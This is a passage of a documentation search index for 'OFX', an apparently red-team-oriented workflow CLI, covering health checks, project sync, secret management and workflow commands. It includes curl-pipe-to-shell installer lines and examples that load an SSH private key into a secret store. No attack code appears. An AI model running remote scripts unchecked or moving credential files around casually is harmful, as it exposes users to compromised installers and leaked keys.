doctor install-help [tool]\n</code></pre>"},{"location":"cli/commands/doctor/#description","title":"Description","text":"<p>The <code>doctor</code> command diagnoses your system environment and checks for:</p> <ul> <li>Essential tools (git, python3)</li> <li>Recommended tools (uv, docker, go, node)</li> <li>Network connectivity</li> <li>System resources (disk, memory)</li> <li>OFX directories and permissions</li> </ul>"},{"location":"cli/commands/doctor/#options","title":"Options","text":"<ul> <li><code>--verbose, -v</code> - Show detailed information including optional tools</li> </ul>"},{"location":"cli/commands/doctor/#examples","title":"Examples","text":""},{"location":"cli/commands/doctor/#basic-health-check","title":"Basic health check","text":"<pre><code>ofx doctor check\n</code></pre>"},{"location":"cli/commands/doctor/#detailed-check-with-recommendations","title":"Detailed check with recommendations","text":"<pre><code>ofx doctor check --verbose\n</code></pre>"},{"location":"cli/commands/doctor/#get-installation-help","title":"Get installation help","text":"<pre><code>ofx doctor install-help docker\n</code></pre>"},{"location":"cli/commands/doctor/#get-all-installation-commands","title":"Get all installation commands","text":"<pre><code>ofx doctor install-help\n</code></pre>"},{"location":"cli/commands/doctor/#health-checks","title":"Health Checks","text":""},{"location":"cli/commands/doctor/#essential-tools","title":"Essential Tools","text":"Tool Purpose Install Command <code>git</code> Version control <code>sudo apt install git</code> <code>python3</code> Runtime environment (\u22653.10) <code>sudo apt install python3</code>"},{"location":"cli/commands/doctor/#recommended-tools","title":"Recommended Tools","text":"Tool Purpose Install Command <code>uv</code> Fast Python package installer <code>curl -LsSf https://astral.sh/uv/install.sh \\| sh</code> <code>docker</code> Container runtime <code>curl https://get.docker.com \\| sh</code> <code>go</code> Go language tools <code>sudo apt install golang-go</code> <code>node</code> Node.js runtime <code>sudo apt install nodejs npm</code>"},{"location":"cli/commands/doctor/#system-health","title":"System Health","text":"<ul> <li>Network: Connectivity to GitHub, Google DNS</li> <li>DNS: Domain resolution check</li> <li>Disk: Free space (&gt;2GB required)</li> <li>Memory: Memory usage (&lt;90% recommended)</li> <li>OFX Directories: Existence and permissions</li> </ul>"},{"location":"cli/commands/doctor/#output","title":"Output","text":"<p>The doctor command provides color-coded output:</p> <ul> <li>\u2705 Green: Check passed</li> <li>\u274c Red: Critical failure</li> <li>\u26a0\ufe0f Yellow: Warning/recommendation</li> </ul>"},{"location":"cli/commands/doctor/#exit-codes","title":"Exit Codes","text":"<ul> <li><code>0</code> - All critical checks passed</li> <li><code>1</code> - One or more critical checks failed</li> </ul>"},{"location":"cli/commands/doctor/#installing-missing-tools","title":"Installing Missing Tools","text":"<p>The doctor will detect your Linux distribution and provide appropriate installation commands:</p> <ul> <li>Debian/Ubuntu: <code>apt</code> commands</li> <li>RedHat/Fedora: <code>dnf</code> commands  </li> <li>Arch: <code>pacman</code> commands</li> <li>OpenSUSE: <code>zypper</code> commands</li> </ul>"},{"location":"cli/commands/doctor/#see-also","title":"See Also","text":"<ul> <li>Getting Started</li> </ul>"},{"location":"cli/commands/dump/","title":"dump","text":"<p>Dump and analyze data structures.</p>"},{"location":"cli/commands/dump/#usage","title":"Usage","text":"<pre><code>ofx dump &lt;type&gt; [options]\n</code></pre>"},{"location":"cli/commands/dump/#description","title":"Description","text":"<p>The <code>dump</code> command extracts and displays internal data structures, configurations, and runtime information. Useful for debugging and inspection.</p>"},{"location":"cli/commands/dump/#dump-types","title":"Dump Types","text":""},{"location":"cli/commands/dump/#config","title":"config","text":"<p>Dump current configuration.</p> <pre><code>ofx dump config\n</code></pre>"},{"location":"cli/commands/dump/#workflow","title":"workflow","text":"<p>Dump workflow structure.</p> <pre><code>ofx dump workflow &lt;workflow-file&gt;\n</code></pre>"},{"location":"cli/commands/dump/#secrets","title":"secrets","text":"<p>List available secrets (values hidden).</p> <pre><code>ofx dump secrets\n</code></pre>"},{"location":"cli/commands/dump/#env","title":"env","text":"<p>Dump environment variables.</p> <pre><code>ofx dump env\n</code></pre>"},{"location":"cli/commands/dump/#tools","title":"tools","text":"<p>List installed tools and paths.</p> <pre><code>ofx dump tools\n</code></pre>"},{"location":"cli/commands/dump/#options","title":"Options","text":"<ul> <li><code>--format &lt;format&gt;</code> - Output format: <code>json</code>, <code>yaml</code>, <code>table</code> (default)</li> <li><code>--output &lt;file&gt;</code> - Save to file</li> <li><code>--full</code> - Include all details</li> </ul>"},{"location":"cli/commands/dump/#examples","title":"Examples","text":""},{"location":"cli/commands/dump/#dump-configuration-as-json","title":"Dump configuration as JSON","text":"<pre><code>ofx dump config --format json\n</code></pre>"},{"location":"cli/commands/dump/#dump-workflow-to-file","title":"Dump workflow to file","text":"<pre><code>ofx dump workflow scan.yaml --output workflow.json --format json\n</code></pre>"},{"location":"cli/commands/dump/#full-environment-dump","title":"Full environment dump","text":"<pre><code>ofx dump env --full\n</code></pre>"},{"location":"cli/commands/dump/#output-formats","title":"Output Formats","text":""},{"location":"cli/commands/dump/#table-default","title":"Table (Default)","text":"<p>Human-readable table format with syntax highlighting.</p>"},{"location":"cli/commands/dump/#json","title":"JSON","text":"<p>Machine-readable JSON format:</p> <pre><code>ofx dump config --format json &gt; config.json\n</code></pre>"},{"location":"cli/commands/dump/#yaml","title":"YAML","text":"<p>YAML format for easy editing:</p> <pre><code>ofx dump workflow attack.yaml --format yaml\n</code></pre>"},{"location":"cli/commands/dump/#use-cases","title":"Use Cases","text":"<ul> <li>Debugging: Inspect internal state</li> <li>Configuration: Export current settings</li> <li>Documentation: Generate workflow documentation</li> <li>Migration: Export for importing elsewhere</li> </ul>"},{"location":"cli/commands/dump/#see-also","title":"See Also","text":"<ul> <li>Workflows</li> </ul>"},{"location":"cli/commands/init/","title":"Init Command","text":"<p>Initializes a new OFX project or workflow directory. This command scaffolds the required folder structure, creates a sample workflow, and optionally sets up Git integration and secret storage.</p>"},{"location":"cli/commands/init/#usage","title":"Usage","text":"<pre><code>ofx project init [OPTIONS]\n</code></pre>"},{"location":"cli/commands/init/#options","title":"Options","text":"<ul> <li><code>--name &lt;project_name&gt;</code>: Specify the project name (default: current directory name)</li> <li><code>--git</code>: Initialize a Git repository</li> <li><code>--remote &lt;url&gt;</code>: Set a remote Git URL</li> <li><code>--encrypt</code>: Enable secret encryption for the project</li> </ul>"},{"location":"cli/commands/init/#example-basic-project-initialization","title":"Example: Basic Project Initialization","text":"<pre><code>ofx project init --name my-redteam-project\n</code></pre> <p>Result: - Creates <code>my-redteam-project/</code> with <code>workflows/</code>, <code>secrets/</code>, and sample files</p>"},{"location":"cli/commands/init/#example-with-git-and-encryption","title":"Example: With Git and Encryption","text":"<pre><code>ofx project init --git --remote https://github.com/user/ofx-demo.git --encrypt\n</code></pre> <p>Result: - Initializes Git, sets remote, and enables encrypted secret storage</p>"},{"location":"cli/commands/init/#after-initialization","title":"After Initialization","text":"<ul> <li>Add workflows to the <code>workflows/</code> directory</li> <li>Store secrets in the <code>secrets/</code> directory (encrypted if enabled)</li> <li>Use <code>ofx flow run &lt;workflow&gt;</code> to execute workflows</li> </ul>"},{"location":"cli/commands/init/#see-also","title":"See Also","text":"<ul> <li>Project Management</li> <li>Secret Management</li> </ul> <p>Initializes a new OFX project or workflow directory. This command scaffolds the required folder structure, creates a sample workflow, and optionally sets up Git integration and secret storage.</p>"},{"location":"cli/commands/init/#usage_1","title":"Usage","text":"<pre><code>ofx project init [OPTIONS]\n</code></pre>"},{"location":"cli/commands/init/#options_1","title":"Options","text":"<ul> <li><code>--name &lt;project_name&gt;</code>: Specify the project name (default: current directory name)</li> <li><code>--git</code>: Initialize a Git repository</li> <li><code>--remote &lt;url&gt;</code>: Set a remote Git URL</li> <li><code>--encrypt</code>: Enable secret encryption for the project</li> </ul>"},{"location":"cli/commands/init/#example-basic-project-initialization_1","title":"Example: Basic Project Initialization","text":"<pre><code>ofx project init --name my-redteam-project\n</code></pre> <p>Result: - Creates <code>my-redteam-project/</code> with <code>workflows/</code>, <code>secrets/</code>, and sample files</p>"},{"location":"cli/commands/init/#example-with-git-and-encryption_1","title":"Example: With Git and Encryption","text":"<pre><code>ofx project init --git --remote https://github.com/user/ofx-demo.git --encrypt\n</code></pre> <p>Result: - Initializes Git, sets remote, and enables encrypted secret storage</p>"},{"location":"cli/commands/init/#after-initialization_1","title":"After Initialization","text":"<ul> <li>Add workflows to the <code>workflows/</code> directory</li> <li>Store secrets in the <code>secrets/</code> directory (encrypted if enabled)</li> <li>Use <code>ofx flow run &lt;workflow&gt;</code> to execute workflows</li> </ul>"},{"location":"cli/commands/init/#see-also_1","title":"See Also","text":"<ul> <li>Project Management</li> <li>Secret Management</li> </ul>"},{"location":"cli/commands/project/","title":"project","text":"<p>Manage OFX projects.</p>"},{"location":"cli/commands/project/#usage","title":"Usage","text":"<pre><code>ofx project &lt;subcommand&gt; [options]\n</code></pre>"},{"location":"cli/commands/project/#subcommands","title":"Subcommands","text":""},{"location":"cli/commands/project/#init","title":"init","text":"<p>Initialize a new project.</p> <pre><code>ofx project init [project-name] [options]\n</code></pre>"},{"location":"cli/commands/project/#sync","title":"sync","text":"<p>Sync project to remote storage.</p> <pre><code>ofx project sync [options]\n</code></pre>"},{"location":"cli/commands/project/#list","title":"list","text":"<p>List all projects.</p> <pre><code>ofx project list\n</code></pre>"},{"location":"cli/commands/project/#project-init","title":"Project init","text":"<p>Initialize a new OFX project with workflows, configurations, and directory structure.</p>"},{"location":"cli/commands/project/#options","title":"Options","text":"<ul> <li><code>--path &lt;path&gt;</code> - Project location (default: <code>~/ofx-projects/&lt;name&gt;</code>)</li> <li><code>--template &lt;template&gt;</code> - Project template to use</li> <li><code>--git</code> - Initialize Git repository</li> </ul>"},{"location":"cli/commands/project/#examples","title":"Examples","text":"<pre><code># Initialize project in current directory\nofx project init my-project\n\n# Initialize with template\nofx project init pentest --template red-team\n\n# Initialize with Git\nofx project init recon --git\n</code></pre>"},{"location":"cli/commands/project/#project-structure","title":"Project Structure","text":"<pre><code>my-project/\n\u251c\u2500\u2500 workflows/       # Workflow definitions\n\u251c\u2500\u2500 data/           # Project data\n\u251c\u2500\u2500 outputs/        # Execution outputs\n\u251c\u2500\u2500 .ofx/           # Project configuration\n\u2514\u2500\u2500 README.md\n</code></pre>"},{"location":"cli/commands/project/#project-sync","title":"Project sync","text":"<p>Synchronize project to remote storage backends.</p>"},{"location":"cli/commands/project/#options_1","title":"Options","text":"<ul> <li><code>--storage &lt;type&gt;</code> - Storage backend: <code>git</code>, <code>s3</code>, <code>ssh</code>, <code>webdav</code></li> <li><code>--encrypt</code> - Encrypt before upload</li> <li><code>--remote &lt;url&gt;</code> - Remote URL/path</li> </ul>"},{"location":"cli/commands/project/#examples_1","title":"Examples","text":"<pre><code># Sync to Git\nofx project sync --storage git --remote git@github.com:user/project.git\n\n# Sync to S3 with encryption\nofx project sync --storage s3 --remote s3://bucket/project --encrypt\n\n# Sync via SSH\nofx project sync --storage ssh --remote user@host:/path/to/backup\n</code></pre>"},{"location":"cli/commands/project/#storage-backends","title":"Storage Backends","text":""},{"location":"cli/commands/project/#git","title":"Git","text":"<p>Version-controlled project sync:</p> <pre><code>ofx project sync --storage git --remote https://github.com/user/repo.git\n</code></pre>"},{"location":"cli/commands/project/#s3","title":"S3","text":"<p>AWS S3 or compatible storage:</p> <pre><code>ofx project sync --storage s3 --remote s3://my-bucket/projects/name\n</code></pre>"},{"location":"cli/commands/project/#ssh","title":"SSH","text":"<p>Remote server via SSH:</p> <pre><code>ofx project sync --storage ssh --remote user@server:/backups/project\n</code></pre>"},{"location":"cli/commands/project/#webdav","title":"WebDAV","text":"<p>WebDAV-compatible storage:</p> <pre><code>ofx project sync --storage webdav --remote https://webdav.server.com/projects\n</code></pre>"},{"location":"cli/commands/project/#encryption","title":"Encryption","text":"<p>Enable encryption for sensitive data:</p> <pre><code>ofx project sync --encrypt --storage s3 --remote s3://bucket/project\n</code></pre> <p>Encryption uses project-specific keys stored securely.</p>"},{"location":"cli/commands/project/#project-list","title":"Project list","text":"<p>List all OFX projects.</p> <pre><code>ofx project list\n</code></pre> <p>Shows: - Project names - Locations - Last modified - Sync status</p>"},{"location":"cli/commands/project/#see-also","title":"See Also","text":"<ul> <li>project init</li> <li>project sync</li> </ul>"},{"location":"cli/commands/run/","title":"Run Command","text":"<p>Executes an OFX workflow YAML file, running all jobs and steps as defined. Supports input variables, secrets, and output options.</p>"},{"location":"cli/commands/run/#usage","title":"Usage","text":""},{"location":"cli/commands/run/#ofx-flow-run-workflowyml-options","title":"<pre><code>ofx flow run &lt;workflow.yml&gt; [OPTIONS]\n</code></pre>","text":"<ul> <li><code>--dry-run</code>: Validate workflow without executing</li> </ul>"},{"location":"cli/commands/run/#example-run-a-workflow","title":"Example: Run a Workflow","text":"<pre><code>ofx flow run workflows/recon.yml --input target=example.com\n</code></pre>"},{"location":"cli/commands/run/#example-with-secrets-and-output","title":"Example: With Secrets and Output","text":""},{"location":"cli/commands/run/#tips","title":"Tips","text":""},{"location":"cli/commands/run/#-use-debug-for-troubleshooting-and-verbose-logs","title":"- Use <code>--debug</code> for troubleshooting and verbose logs","text":""},{"location":"cli/commands/run/#usage_1","title":"Usage","text":"<pre><code>ofx flow run &lt;workflow.yml&gt; [OPTIONS]\n</code></pre>"},{"location":"cli/commands/run/#options","title":"Options","text":"<ul> <li><code>--input key=value</code>: Set input variables (can be repeated)</li> <li><code>--secret key=value</code>: Provide secrets (can be repeated)</li> <li><code>--output &lt;dir&gt;</code>: Specify output directory for artifacts</li> <li><code>--dry-run</code>: Validate workflow without executing</li> <li><code>--debug</code>: Show detailed execution logs</li> </ul>"},{"location":"cli/commands/run/#example-run-a-workflow_1","title":"Example: Run a Workflow","text":"<pre><code>ofx flow run workflows/recon.yml --input target=example.com\n</code></pre>"},{"location":"cli/commands/run/#example-with-secrets-and-output_1","title":"Example: With Secrets and Output","text":"<pre><code>ofx flow run workflows/exploit.yml --input target=10.0.0.1 --secret API_KEY=xxx --output results/\n</code></pre>"},{"location":"cli/commands/run/#tips_1","title":"Tips","text":"<ul> <li>Use <code>--dry-run</code> to check for errors before running</li> <li>Use <code>--debug</code> for troubleshooting and verbose logs</li> <li>Outputs and logs are saved in the specified output directory</li> </ul>"},{"location":"cli/commands/run/#see-also","title":"See Also","text":"<ul> <li>Workflow Syntax</li> <li>Inputs &amp; Secrets</li> </ul>"},{"location":"cli/commands/run/#see-also_1","title":"See Also","text":"<ul> <li>Workflow Syntax</li> <li>Inputs &amp; Secrets</li> </ul>"},{"location":"cli/commands/secret/","title":"secret","text":"<p>Manage secrets and credentials.</p>"},{"location":"cli/commands/secret/#usage","title":"Usage","text":"<pre><code>ofx secret &lt;subcommand&gt; [options]\n</code></pre>"},{"location":"cli/commands/secret/#subcommands","title":"Subcommands","text":""},{"location":"cli/commands/secret/#add","title":"add","text":"<p>Add a new secret.</p> <pre><code>ofx secret add &lt;name&gt; [--value &lt;value&gt;] [--file &lt;file&gt;]\n</code></pre>"},{"location":"cli/commands/secret/#list","title":"list","text":"<p>List all secrets.</p> <pre><code>ofx secret list [--show-values]\n</code></pre>"},{"location":"cli/commands/secret/#get","title":"get","text":"<p>Get a specific secret value.</p> <pre><code>ofx secret get &lt;name&gt;\n</code></pre>"},{"location":"cli/commands/secret/#delete","title":"delete","text":"<p>Delete a secret.</p> <pre><code>ofx secret delete &lt;name&gt;\n</code></pre>"},{"location":"cli/commands/secret/#import","title":"import","text":"<p>Import secrets from file.</p> <pre><code>ofx secret import &lt;file&gt;\n</code></pre>"},{"location":"cli/commands/secret/#export","title":"export","text":"<p>Export secrets to file.</p> <pre><code>ofx secret export [--output &lt;file&gt;]\n</code></pre>"},{"location":"cli/commands/secret/#description","title":"Description","text":"<p>The <code>secret</code> command provides secure storage and management of sensitive data like API keys, passwords, and tokens. Secrets are encrypted at rest and can be used in workflows.</p>"},{"location":"cli/commands/secret/#examples","title":"Examples","text":""},{"location":"cli/commands/secret/#add-a-secret-interactively","title":"Add a secret interactively","text":"<pre><code>ofx secret add SHODAN_API_KEY\n# Will prompt for value\n</code></pre>"},{"location":"cli/commands/secret/#add-secret-from-command-line","title":"Add secret from command line","text":"<pre><code>ofx secret add API_TOKEN --value \"secret_value_here\"\n</code></pre>"},{"location":"cli/commands/secret/#add-secret-from-file","title":"Add secret from file","text":"<pre><code>ofx secret add SSH_KEY --file ~/.ssh/id_rsa\n</code></pre>"},{"location":"cli/commands/secret/#list-secrets-values-hidden","title":"List secrets (values hidden)","text":"<pre><code>ofx secret list\n</code></pre>"},{"location":"cli/commands/secret/#show-secret-values","title":"Show secret values","text":"<pre><code>ofx secret list --show-values\n</code></pre>"},{"location":"cli/commands/secret/#get-specific-secret","title":"Get specific secret","text":"<pre><code>ofx secret get SHODAN_API_KEY\n</code></pre>"},{"location":"cli/commands/secret/#delete-a-secret","title":"Delete a secret","text":"<pre><code>ofx secret delete OLD_TOKEN\n</code></pre>"},{"location":"cli/commands/secret/#import-from-json-file","title":"Import from JSON file","text":"<pre><code>ofx secret import secrets.json\n</code></pre>"},{"location":"cli/commands/secret/#export-secrets","title":"Export secrets","text":"<pre><code>ofx secret export --output backup.json\n</code></pre>"},{"location":"cli/commands/secret/#secret-storage","title":"Secret Storage","text":"<p>Secrets are stored encrypted in:</p> <pre><code>~/.local/share/ofx/secrets.enc\n</code></pre> <p>Encryption uses a master key derived from your system credentials.</p>"},{"location":"cli/commands/secret/#using-secrets-in-workflows","title":"Using Secrets in Workflows","text":"<p>Reference secrets in workflows:</p> <pre><code>name: api-scan\njobs:\n  scan:\n    steps:\n      - name: Scan with API\n        run: |\n          curl -H \"X-API-Key: ${{ secrets.SHODAN_API_KEY }}\" \\\n            https://api.shodan.io/search\n</code></pre>"},{"location":"cli/commands/secret/#importexport-format","title":"Import/Export Format","text":"<p>JSON format:</p> <pre><code>{\n  \"secrets\": {\n    \"API_KEY\": \"value1\",\n    \"PASSWORD\": \"value2\"\n  },\n  \"metadata\": {\n    \"exported_at\": \"2024-01-01T00:00:00Z\"\n  }\n}\n</code></pre>"},{"location":"cli/commands/secret/#security-features","title":"Security Features","text":"<ul> <li>Encryption at rest: AES-256 encryption</li> <li>Secure input: Values hidden during interactive input</li> <li>Access control: Per-user secret stores</li> <li>Audit logging: Secret access logged</li> <li>Auto-masking: Values masked in logs</li> </ul>"},{"location":"cli/commands/secret/#see-also","title":"See Also","text":"<ul> <li>Secrets Guide</li> <li>Inputs</li> </ul>"},{"location":"cli/commands/sync/","title":"project sync","text":"<p>Synchronize project to remote storage.</p>"},{"location":"cli/commands/sync/#usage","title":"Usage","text":"<pre><code>ofx project sync [options]\n</code></pre>"},{"location":"cli/commands/sync/#description","title":"Description","text":"<p>The <code>sync</code> command backs up and synchronizes your OFX project to remote storage backends. Supports multiple storage providers with optional encryption.</p>"},{"location":"cli/commands/sync/#options","title":"Options","text":"<ul> <li><code>--storage &lt;type&gt;</code> - Storage backend (required): <code>git</code>, <code>s3</code>, <code>ssh</code>, <code>webdav</code></li> <li><code>--remote &lt;url&gt;</code> - Remote URL or path (required)</li> <li><code>--encrypt</code> - Encrypt data before upload</li> <li><code>--encryption-key &lt;key&gt;</code> - Custom encryption key</li> <li><code>--project &lt;path&gt;</code> - Project path (default: current directory)</li> <li><code>--force</code> - Force sync even if conflicts exist</li> </ul>"},{"location":"cli/commands/sync/#storage-backends","title":"Storage Backends","text":""},{"location":"cli/commands/sync/#git","title":"Git","text":"<p>Sync to Git repository with version control.</p> <pre><code>ofx project sync \\\n  --storage git \\\n  --remote git@github.com:user/project.git\n</code></pre> <p>Features: - Full version history - Branch support - Conflict resolution - Automated commits</p>"},{"location":"cli/commands/sync/#s3","title":"S3","text":"<p>Sync to AWS S3 or compatible object storage.</p> <pre><code>ofx project sync \\\n  --storage s3 \\\n  --remote s3://my-bucket/projects/my-project \\\n  --encrypt\n</code></pre> <p>Features: - Scalable storage - Built-in redundancy - Access control - Encryption at rest</p> <p>Configuration: Set AWS credentials: <pre><code>export AWS_ACCESS_KEY_ID=\"...\"\nexport AWS_SECRET_ACCESS_KEY=\"...\"\n</code></pre></p>"},{"location":"cli/commands/sync/#ssh","title":"SSH","text":"<p>Sync to remote server via SSH/SFTP.</p> <pre><code>ofx project sync \\\n  --storage ssh \\\n  --remote user@server.com:/backups/my-project\n</code></pre> <p>Features: - Secure transfer - Compression - Resume capability - SSH key authentication</p> <p>Requirements: - SSH access to remote server - SSH key configured</p>"},{"location":"cli/commands/sync/#webdav","title":"WebDAV","text":"<p>Sync to WebDAV-compatible storage (Nextcloud, ownCloud, etc.).</p> <pre><code>ofx project sync \\\n  --storage webdav \\\n  --remote https://cloud.example.com/remote.php/dav/files/user/projects/\n</code></pre> <p>Features: - Cloud storage integration - Standard protocol - Wide compatibility</p> <p>Authentication: Set credentials: <pre><code>ofx secret add WEBDAV_USER --value username\nofx secret add WEBDAV_PASS --value password\n</code></pre></p>"},{"location":"cli/commands/sync/#encryption","title":"Encryption","text":""},{"location":"cli/commands/sync/#default-encryption","title":"Default Encryption","text":"<pre><code>ofx project sync --storage s3 --remote s3://bucket/project --encrypt\n</code></pre> <p>Uses project-specific encryption key stored in secret manager.</p>"},{"location":"cli/commands/sync/#custom-encryption-key","title":"Custom Encryption Key","text":"<pre><code>ofx project sync \\\n  --storage ssh \\\n  --remote user@host:/backup \\\n  --encrypt \\\n  --encryption-key \"$MY_KEY\"\n</code></pre>"},{"location":"cli/commands/sync/#what-gets-encrypted","title":"What Gets Encrypted","text":"<p>When <code>--encrypt</code> is used: - \u2705 Workflow files - \u2705 Project data - \u2705 Outputs - \u2705 Configurations - \u274c Metadata (for searching)</p>"},{"location":"cli/commands/sync/#sync-process","title":"Sync Process","text":"<ol> <li>Prepare: Collect project files</li> <li>Compress: Create project bundle</li> <li>Encrypt (if enabled): Encrypt bundle</li> <li>Upload: Transfer to remote storage</li> <li>Verify: Check upload integrity</li> <li>Cleanup: Remove temporary files</li> </ol>"},{"location":"cli/commands/sync/#examples","title":"Examples","text":""},{"location":"cli/commands/sync/#initial-sync-to-git","title":"Initial sync to Git","text":"<pre><code>ofx project sync \\\n  --storage git \\\n  --remote https://github.com/user/my-project.git\n</code></pre>"},{"location":"cli/commands/sync/#encrypted-s3-backup","title":"Encrypted S3 backup","text":"<pre><code>ofx project sync \\\n  --storage s3 \\\n  --remote s3://my-backups/ofx-projects/pentest \\\n  --encrypt\n</code></pre>"},{"location":"cli/commands/sync/#ssh-with-custom-project-path","title":"SSH with custom project path","text":"<pre><code>ofx project sync \\\n  --storage ssh \\\n  --remote backup@server:/mnt/backups/ofx \\\n  --project /home/user/custom-project\n</code></pre>"},{"location":"cli/commands/sync/#force-sync-overwrite-remote","title":"Force sync (overwrite remote)","text":"<pre><code>ofx project sync \\\n  --storage git \\\n  --remote origin \\\n  --force\n</code></pre>"},{"location":"cli/commands/sync/#sync-status","title":"Sync Status","text":"<p>Check last sync:</p> <pre><code>ofx project list\n</code></pre> <p>Shows sync status for each project.</p>"},{"location":"cli/commands/sync/#troubleshooting","title":"Troubleshooting","text":""},{"location":"cli/commands/sync/#authentication-failed","title":"Authentication Failed","text":"<p>Git: Check SSH keys or HTTPS credentials <pre><code>ssh -T git@github.com\n</code></pre></p> <p>S3: Verify AWS credentials <pre><code>aws s3 ls s3://bucket\n</code></pre></p> <p>SSH: Test SSH connection <pre><code>ssh user@server\n</code></pre></p>"},{"location":"cli/commands/sync/#sync-conflicts","title":"Sync Conflicts","text":"<p>If remote has changes: <pre><code># Pull changes first\ngit pull  # for Git backend\n\n# Or force overwrite\nofx project sync --force\n</code></pre></p>"},{"location":"cli/commands/sync/#see-also","title":"See Also","text":"<ul> <li>project init</li> <li>project</li> </ul>"},{"location":"cli/commands/tools/","title":"flow tools","text":"<p>Manage workflow tool dependencies.</p>"},{"location":"cli/commands/tools/#usage","title":"Usage","text":"<pre><code>ofx flow tools &lt;subcommand&gt; [options]\n</code></pre>"},{"location":"cli/commands/tools/#subcommands","title":"Subcommands","text":""},{"location":"cli/commands/tools/#install","title":"install","text":"<p>Install required tools for a workflow.</p> <pre><code>ofx flow tools install &lt;workflow&gt;\n</code></pre>"},{"location":"cli/commands/tools/#list","title":"list","text":"<p>List tools required by a workflow.</p> <pre><code>ofx flow tools list &lt;workflow&gt;\n</code></pre>"},{"location":"cli/commands/tools/#check","title":"check","text":"<p>Check if required tools are installed.</p> <pre><code>ofx flow tools check &lt;workflow&gt;\n</code></pre>"},{"location":"cli/commands/tools/#description","title":"Description","text":"<p>The <code>tools</code> command helps manage external tool dependencies required by workflows. Tools are installed in <code>~/Tools/bin</code> and automatically added to PATH during workflow execution.</p>"},{"location":"cli/commands/tools/#examples","title":"Examples","text":""},{"location":"cli/commands/tools/#install-workflow-tools","title":"Install workflow tools","text":"<pre><code>ofx flow tools install recon-workflow.yaml\n</code></pre>"},{"location":"cli/commands/tools/#list-required-tools","title":"List required tools","text":"<pre><code>ofx flow tools list attack-chain\n</code></pre>"},{"location":"cli/commands/tools/#check-tool-availability","title":"Check tool availability","text":"<pre><code>ofx flow tools check scan-workflow\n</code></pre>"},{"location":"cli/commands/tools/#tool-installation","title":"Tool Installation","text":"<p>Tools can be installed via:</p> <ul> <li>UV - Python packages via <code>uv tool install</code></li> <li>Binary - Direct binary downloads</li> <li>Package Manager - System package managers</li> <li>Custom - User-defined installation scripts</li> </ul>"},{"location":"cli/commands/tools/#tool-configuration","title":"Tool Configuration","text":"<p>Define tools in workflow:</p> <pre><code>name: my-workflow\ntools:\n  - name: nuclei\n    install: uv tool install nuclei\n  - name: httpx\n    install: go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest\n</code></pre>"},{"location":"cli/commands/tools/#see-also","title":"See Also","text":"<ul> <li>flow run</li> <li>Extending OFX</li> </ul>"},{"location":"cli/commands/update/","title":"flow update","text":"<p>Update workflow definitions from templates and modules.</p>"},{"location":"cli/commands/update/#usage","title":"Usage","text":"<pre><code>ofx flow update [workflow] [options]\n</code></pre>"},{"location":"cli/commands/update/#description","title":"Description","text":"<p>Updates workflow files with latest templates, resolves template references, and refreshes workflow definitions from remote sources.</p>"},{"location":"cli/commands/update/#options","title":"Options","text":"<ul> <li><code>--all</code> - Update all workflows</li> <li><code>--check</code> - Check for updates without applying</li> <li><code>--source &lt;url&gt;</code> - Update from specific source</li> </ul>"},{"location":"cli/commands/update/#examples","title":"Examples","text":""},{"location":"cli/commands/update/#update-specific-workflow","title":"Update specific workflow","text":"<pre><code>ofx flow update my-workflow.yaml\n</code></pre>"},{"location":"cli/commands/update/#update-all-workflows","title":"Update all workflows","text":"<pre><code>ofx flow update --all\n</code></pre>"},{"location":"cli/commands/update/#check-for-updates","title":"Check for updates","text":"<pre><code>ofx flow update --check --all\n</code></pre>"},{"location":"cli/commands/update/#update-from-source","title":"Update from source","text":"<pre><code>ofx flow update --source https://github.com/user/workflows\n</code></pre>"},{"location":"cli/commands/update/#update-process","title":"Update Process","text":"<ol> <li>Check template references</li> <li>Resolve remote includes</li> <li>Download updated templates</li> <li>Merge with local customizations</li> <li>Validate updated workflow</li> </ol>"},{"location":"cli/commands/update/#template-resolution","title":"Template Resolution","text":"<p>Workflows can reference templates:</p> <pre><code>name: my-workflow\ntemplate: base-recon\njobs:\n  scan:\n    uses: github.com/user/workflows/scan.yaml\n</code></pre> <p>The <code>update</code> command resolves these references and fetches latest versions.</p>"},{"location":"cli/commands/update/#see-also","title":"See Also","text":"<ul> <li>flow run</li> <li>Templates Guide</li> </ul>"},{"location":"cli/commands/validate/","title":"flow validate","text":"<p>Validate workflow syntax and configuration.</p>"},{"location":"cli/commands/validate/#usage","title":"Usage","text":"<pre><code>ofx flow validate &lt;workflow&gt;\n</code></pre>"},{"location":"cli/commands/validate/#description","title":"Description","text":"<p>The <code>validate</code> command checks workflow files for:</p> <ul> <li>YAML syntax errors</li> <li>Schema validation</li> <li>Dependency resolution</li> <li>Required field validation</li> <li>Type checking</li> </ul>"},{"location":"cli/commands/validate/#arguments","title":"Arguments","text":"<ul> <li><code>workflow</code> - Path to workflow file or workflow name</li> </ul>"},{"location":"cli/commands/validate/#examples","title":"Examples","text":""},{"location":"cli/commands/validate/#validate-a-workflow-file","title":"Validate a workflow file","text":"<pre><code>ofx flow validate my-workflow.yaml\n</code></pre>"},{"location":"cli/commands/validate/#validate-a-named-workflow","title":"Validate a named workflow","text":"<pre><code>ofx flow validate attack-chain\n</code></pre>"},{"location":"cli/commands/validate/#validation-checks","title":"Validation Checks","text":"Check Description Syntax Valid YAML format Schema Matches workflow schema Dependencies All job dependencies exist Required Fields Name, jobs defined Types Correct data types"},{"location":"cli/commands/validate/#exit-codes","title":"Exit Codes","text":"<ul> <li><code>0</code> - Validation passed</li> <li><code>1</code> - Validation failed</li> </ul>"},{"location":"cli/commands/validate/#see-also","title":"See Also","text":"<ul> <li>flow run</li> <li>flow visualize</li> </ul>"},{"location":"cli/commands/visualize/","title":"flow visualize","text":"<p>Visualize workflow dependencies and execution flow.</p>"},{"location":"cli/commands/visualize/#usage","title":"Usage","text":"<pre><code>ofx flow visualize &lt;workflow&gt; [options]\n</code></pre>"},{"location":"cli/commands/visualize/#description","title":"Description","text":"<p>Creates visual representations of workflow structure, dependencies, and execution stages. Displays:</p> <ul> <li>Workflow dependency graph</li> <li>Execution stages</li> <li>Job relationships</li> <li>Parallel execution opportunities</li> </ul>"},{"location":"cli/commands/visualize/#arguments","title":"Arguments","text":"<ul> <li><code>workflow</code> - Workflow file or name to visualize</li> </ul>"},{"location":"cli/commands/visualize/#options","title":"Options","text":"<ul> <li><code>--format &lt;format&gt;</code> - Output format: <code>terminal</code> (default), <code>dot</code>, <code>json</code></li> <li><code>--output &lt;file&gt;</code> - Save visualization to file</li> <li><code>--detailed</code> - Show detailed job information</li> 